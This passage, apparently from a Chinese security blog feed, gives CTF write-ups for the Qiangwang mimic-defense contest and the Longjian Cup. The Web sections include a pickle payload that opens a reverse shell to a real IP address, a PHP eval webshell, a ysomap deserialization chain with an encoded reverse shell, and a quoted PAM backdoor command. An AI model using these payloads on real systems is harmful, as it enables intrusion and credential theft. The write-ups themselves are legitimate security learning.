class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0(S&quot;__import__(&#x27;subprocess&#x27;).call(\&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/116.62.243.231/1500 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x\&quot;,shell=True)&quot;</span></span><br><span class="line"><span class="string">iconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这里利用 i 操作码。</p><blockquote><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）。</p></blockquote><p>直接调用并执行 backdoor 函数，弹 shell 拿到 flag。</p><p>最后贴上 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0(S&quot;__import__(&#x27;subprocess&#x27;).call(\&quot;echo &#x27;sh -i &gt;&amp; /dev/tcp/116.62.243.231/1500 0&gt;&amp;1&#x27;&gt;x &amp;&amp; bash x &amp;&amp; rm -rf x\&quot;,shell=True)&quot;</span></span><br><span class="line"><span class="string">iconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickletools.dis(data)</span></span><br><span class="line">print(base64.b64encode(data))</span><br></pre></td></tr></table></figure><h3 id="new-hospital"><a href="#new-hospital" class="headerlink" title="new_hospital"></a>new_hospital</h3><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024214226409.png"></p><p>扫出来存在 old 目录，在 old 目录下的 feature.php 文件中存在被<code>base64</code> 编码过的 API cookie 参数，随便输一下发现存在 <code>file_get_contents</code>，读取文件 <code>feature.php</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;API&#x27;</span>]!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;API&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>找一找 flag 发现在 /var/www/html/flag.php。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211025143008426.png"></p><h3 id="EasyFilter"><a href="#EasyFilter" class="headerlink" title="EasyFilter"></a>EasyFilter</h3><p>题目给出源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">        @mkdir(<span class="string">&quot;./files/&quot;</span>);</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="variable">$file</span> = bin2hex(random_bytes(<span class="number">5</span>));</span><br><span class="line">        file_put_contents(<span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>,base64_encode(<span class="variable">$content</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;r&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./files/&quot;</span>.<span class="variable">$r</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;php://filter/resource=<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显是 使用 <code>action</code> 参数写入文件和读取文件。</p><p>先写一个 <code>phpinfo</code>。</p><blockquote><p>?action=w&amp;c=%3C%3Fphp%20phpinfo()%3B%3F%3E</p></blockquote><p>经过<code>fuzz</code>后发现可以利用 <code>@</code> 截断之前的 <code>php://filter/resource=./files/</code>，使之前的过滤器判断为文件目录。</p><blockquote><p>?action=r&amp;r=convert.base64-decode/resource@/../../../files/1c1d4f0ae3</p></blockquote><p>成功得到 <code>phpinfo</code>。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024202310264.png"></p><p>那就可以写马了，直接写一个 POST 的马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=w&amp;c=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024202638427.png"></p><p>拿到flag</p><h3 id="Give-me-your-0day"><a href="#Give-me-your-0day" class="headerlink" title="Give_me_your_0day"></a>Give_me_your_0day</h3><p><code>Typecho</code> 的 mysql 数据库创建，数据库地址和端口可控，发现可抓包更改数据库的适配器，更改为<code>mysqli</code> ，然后使用 <a href="https://github.com/allyshka/Rogue-MySql-Server">roguemysql.php</a> 脚本执行任意文件读取即可读取flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211025001309050.png"></p><p>回显。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211025001351597.png"></p><p>得到flag</p><h3 id="Jack-Shiro"><a href="#Jack-Shiro" class="headerlink" title="Jack-Shiro"></a>Jack-Shiro</h3><p>扫目录，得到/json。</p><p><img src="https://xiquanmuhua.github.io/images/nitai/json1.png"></p><p>然后抓包，发现重定向到/login。</p><p>查到CVE-2020-1957，可以绕过权限。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211025002814242.png" alt="image-20211025002814242"></p><p><a href="http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB/">jackson反序列化</a>和<a href="https://paper.seebug.org/942/#ldapgadget">JNDI注入</a>，然后利用LDAP返回序列化数据触发本地Gadget Bypass限制。</p><p>使用工具ysomap，将服务器作为跳板。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit LDAPLocalChainListener</span><br><span class="line"><span class="built_in">set</span> lport port</span><br><span class="line">use payload  CommonsCollections8</span><br><span class="line">use bullet TransformerBullet</span><br><span class="line"><span class="built_in">set</span> version 3</span><br><span class="line">args <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiBpcC9wb3J0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>发包执行。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/2021-10-25%20(2).png"></p><p>成功弹shell，拿取flag:<br><img src="https://xiquanmuhua.github.io/images/nitai/json2.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="WeirdPhoto"><a href="#WeirdPhoto" class="headerlink" title="WeirdPhoto"></a>WeirdPhoto</h3><p>010打开图片发现报错。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024165357759.png"></p><p>crc 脚本爆破下宽高。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">input</span>(<span class="string">&quot;图片地址：&quot;</span>)</span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">0x0c</span>:<span class="number">0x1d</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+<span class="built_in">str</span>(binascii.b2a_hex(fr[<span class="number">0x1d</span>:<span class="number">0x21</span>]))[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="number">4095</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure><p>得到图片。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024165555400.png"></p><p>猜测是个密码，找了半天发现只有<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">千千秀字的栅栏密码</a>能得到明文。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024165931584.png"></p><blockquote><p>THISISTHEANSWERTOOBSFUCATION</p></blockquote><p>使用密码解出 out 文件，010看了看发现是 pdf 文件，且缺少文件头，补全文件头，得到完整的 PDF 文件。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024170254653.png"></p><p>使用 Wbsteg4.3open 空密码解密得到 flag。</p><h3 id="mirror"><a href="#mirror" class="headerlink" title="mirror"></a>mirror</h3><p>打开图片发现存在 CRC 错误。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024180058978.png"></p><p>脚本修复得到原图。</p><p><img src="C:\Users\violet\Desktop\study\WriteUp\第四届“强网”拟态防御国际精英挑战赛\image-20211024215312657.png" alt="image-20211024215312657"></p><p>010 打开图片后在文件尾发现了另一个 <code>IEND</code>，猜测存在另一个图片。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024180902268.png"></p><p>提取出来后写个脚本倒转。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;source&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">data = [file[i:i + <span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(file), <span class="number">16</span>)]</span><br><span class="line">data.reverse()</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;result.png&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(<span class="string">b&quot;&quot;</span>.join(data))</span><br></pre></td></tr></table></figure><p>010打开图片后发现还是有 CRC 错误，修复得到原图，发现是两张一样的图片。</p><p><img src="C:\Users\violet\Desktop\study\WriteUp\第四届“强网”拟态防御国际精英挑战赛\image-20211024215437631.png"></p><p>猜测是盲水印隐写，利用脚本解出图片。</p><p><img src="C:\Users\violet\Desktop\study\WriteUp\第四届“强网”拟态防御国际精英挑战赛\image-20211024215544280.png"></p><p>仔细看发现有一串翻转后的数字，翻转后取出数字。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024182214373.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32effq8aa8374a02a9p1636ae8901qa0</span><br></pre></td></tr></table></figure><p>根据题目提示写个脚本替换字符。</p><blockquote><p>2-5 e-6 9-a p-b q-d</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;32effq8aa8374a02a9p1636ae8901qa0&quot;</span>.translate(<span class="built_in">str</span>.maketrans(<span class="string">&quot;2e9pq56abd&quot;</span>, <span class="string">&quot;56abd2e9pq&quot;</span>)))</span><br></pre></td></tr></table></figure><p>最终得到flag</p><h3 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h3><p>将题目给出的 GIF 图片使用 Gifsplitter 分离，很明显的 白色和黑色图片，中间夹杂着一些灰色图片，以灰色图片为分割点，将 黑白图片 转换为 01 二进制，然后发现可以摩斯密码解密。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024192847434.png"></p><p>得到提示 <code>CODE93</code>，查找得知是一种条码规范，那剩下的 黑白 图片应该是一个条码图片，写脚本转换为 01 字符，然后对照 <code>CODE93</code>码表，得出字符串。</p><p>转换字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;./result/&quot;</span></span><br><span class="line">mark1 = Image.<span class="built_in">open</span>(path + <span class="string">&quot;IMG00027.bmp&quot;</span>).getpixel((<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">m1 = mark1</span><br><span class="line">mark0 = Image.<span class="built_in">open</span>(path + <span class="string">&quot;IMG00028.bmp&quot;</span>).getpixel((<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">m0 = mark0</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>, <span class="number">334</span>):</span><br><span class="line">    tmp = Image.<span class="built_in">open</span>(path + <span class="string">f&quot;IMG<span class="subst">&#123;i:05d&#125;</span>.bmp&quot;</span>).getpixel((<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">if</span> tmp == m1:</span><br><span class="line">        data += <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> tmp == m0:</span><br><span class="line">        data += <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>由于 CODE93 存在校验码，且出题人用 0 将校验码填充了，将校验码部分删去，得到字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">directory = &#123;<span class="string">&quot;100010100&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;101001000&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;101000100&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;101000010&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;100101000&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;100100100&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;100100010&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">             <span class="string">&quot;101010000&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;100010010&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;100001010&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">             <span class="string">&quot;110101000&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;110100100&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;110100010&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;110010100&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;110010010&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;110001010&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;101101000&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">             <span class="string">&quot;101100100&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;101100010&quot;</span>: <span class="string">&quot;I&quot;</span>, <span class="string">&quot;100110100&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;100011010&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;101011000&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;101001100&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;101000110&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">             <span class="string">&quot;100101100&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;100010110&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;110110100&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;110110010&quot;</span>: <span class="string">&quot;R&quot;</span>, <span class="string">&quot;110101100&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;110100110&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;110010110&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">             <span class="string">&quot;110011010&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;101101100&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;101100110&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;100110110&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;100111010&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;100101110&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;111010100&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">             <span class="string">&quot;111010010&quot;</span>: <span class="string">&quot;SPACE&quot;</span>, <span class="string">&quot;111001010&quot;</span>: <span class="string">&quot;$&quot;</span>, <span class="string">&quot;101101110&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;101110110&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;110101110&quot;</span>: <span class="string">&quot;%&quot;</span>, <span class="string">&quot;100100110&quot;</span>: <span class="string">&quot;($)&quot;</span>, <span class="string">&quot;111011010&quot;</span>: <span class="string">&quot;(%)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;111010110&quot;</span>: <span class="string">&quot;(/)&quot;</span>, <span class="string">&quot;100110010&quot;</span>: <span class="string">&quot;(+)&quot;</span>, <span class="string">&quot;101011110&quot;</span>: <span class="string">&quot;* Start/Stop&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">data = <span class="string">&quot;101011110110001010100010100110100010100100010101000100110010100110100100100001010101010000101000010100100010100010010100101000110010100110100100110010100110101000100010010100001010100100010110001010100001010110100010100100100110001010100100010110010100100001010100100010101000100&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data) - <span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    result += directory[data[i: i + <span class="number">9</span>]]</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>字符串</p><blockquote><p>* Start/StopF0C62DB973684DBDA896F9C5F6D962</p></blockquote><p>拿去 <a href="https://cn.online-qrcode-generator.com/code93ext-barcode-generator">条形码网站</a> 重新生成一次条形码，读取后面的校验码。</p><p>tips: 经题目提示得知要小写，改为小写生成条形码。</p><p>得到校验码。</p><blockquote><p>110010110 101001100</p></blockquote><p>再拿去码表对照得到 <code>um</code>。</p><p>拼接后为完整 flag</p><h3 id="BlueWhale"><a href="#BlueWhale" class="headerlink" title="BlueWhale"></a>BlueWhale</h3><p>使用 7-zip 解压文件得到一个流量包和一个压缩文件。</p><p>流量包在追踪 tcp 流的时候发现 <code>password</code>。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024211954382.png"></p><blockquote><p>th1sIsThEpassw0rD</p></blockquote><p>010 查看压缩包中的 <code>password.txt</code> 大小为17，且用的是 <code>deflate</code> 算法压缩的，猜测为明文攻击。</p><p>将得到的 password 放入文档然后使用 <code>bandizip</code> 进行 <code>deflate</code> 算法压缩，得到的 CRC 与压缩文件的 CRC 相同。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024212745513.png"></p><p>使用 <code>ARCHPR</code> 进行明文，得到密码。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024212907656.png"></p><p>将得到的图片去试试 <code>zsteg</code>，发现可以一把梭得到flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20211024213050373.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;zerocalc&quot;&gt;&lt;a href=&quot;#zerocalc&quot; class=&quot;headerlink&quot; title=&quot;zeroc</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>1st 陇剑杯部分WP</title>
    <link href="https://rossweisse.github.io/2021/09/18/WriteUp/1st%20%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/"/>
    <id>https://rossweisse.github.io/2021/09/18/WriteUp/1st%20%E9%99%87%E5%89%91%E6%9D%AF%E9%83%A8%E5%88%86WP/</id>
    <published>2021-09-18T11:52:16.000Z</published>
    <updated>2021-09-18T12:02:00.156Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1st-陇剑杯部分WP"><a href="#1st-陇剑杯部分WP" class="headerlink" title="1st 陇剑杯部分WP"></a>1st 陇剑杯部分WP</h1><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><h3 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h3><p>跟踪 TCP 流可发现 token 为 <code>jwt</code> 认证</p><h3 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h3><p>用成功拿到 shell 的 token 去 <a href="https://jwt.io/">jwt解码网站</a>可以解出来，10087#admin</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914202932464.png"></p><h3 id="2-3"><a href="#2-3" class="headerlink" title="2.3"></a>2.3</h3><p>拿到 shell 的 TCP 流中可以看到是 <code>root</code> 权限。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914203141918.png"></p><h3 id="2-4"><a href="#2-4" class="headerlink" title="2.4"></a>2.4</h3><p>通过后面的命令可以得到 =&gt; 1.c</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914211425170.png"></p><h3 id="2-5"><a href="#2-5" class="headerlink" title="2.5"></a>2.5</h3><p>通过解码创建的 Makefile 文件即可得到 =&gt; looter.so</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914211651370.png"></p><p>=&gt; </p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914211705013.png"></p><h3 id="2-6"><a href="#2-6" class="headerlink" title="2.6"></a>2.6</h3><p>通过后面的命令可以得到 =&gt; <code>/etc/pam.d/common-auth</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command=echo%20&quot;auth%20optional%20looter.so&quot;&gt;&gt;/etc/pam.d/common-auth</span><br></pre></td></tr></table></figure><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h3><p>可在 login 得到 =&gt; <code>Admin123!@#</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914212031840.png"></p><h3 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h3><p>在注入 shell 的地方可以看到</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914223305587.png"></p><p>但要注意要的是绝对路径，所以要补全 <code>/var/www/html/data/Runtime/Logs/Home/21_08_07.log</code></p><h3 id="3-3"><a href="#3-3" class="headerlink" title="3.3"></a>3.3</h3><p>就在 3-2 的流里可以看到 =&gt; <code>www-data</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914223429073.png"></p><h3 id="3-4"><a href="#3-4" class="headerlink" title="3.4"></a>3.4</h3><p>在后面的 33 流里可以看到 =&gt; <code>1.php</code></p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210914223550027.png"></p><h3 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h3><p>查看 37 http 流并与 39 http 流对比可发现多了一个 <code>frpc.ini</code> 文件，猜测上传的代理工具客户端为 frpc。</p><h3 id="3-6-3-7"><a 